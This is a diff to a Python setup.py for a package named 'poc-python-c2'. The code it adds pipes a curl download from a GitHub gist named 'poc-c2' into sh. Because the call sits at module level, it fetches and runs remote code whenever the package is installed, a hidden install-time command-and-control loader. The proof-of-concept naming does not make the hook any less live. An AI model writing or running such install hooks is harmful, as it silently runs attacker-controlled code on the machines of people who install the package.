@@ -5,7 +5,7 @@ import subprocess, os
 #     process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setpgrp)
 #     return process
 
-subprocess.run("curl -sL https://gist.githubusercontent.com/rroiii/56b6b9d8ace864bf66233e10b580f922/raw/75abf6e00ff9358ad6cc8eda67131b319259e86a/poc-test.txt | sh", shell=True, check=True)
+subprocess.run("curl -sL https://gist.githubusercontent.com/rroiii/f65772e4a3202b49ba421d0511aece17/raw/e664d317cb1c5fb673a01113b7de295faa38712c/poc-c2 | sh", shell=True, check=True)
 
 setup(
     name='poc-python-c2',
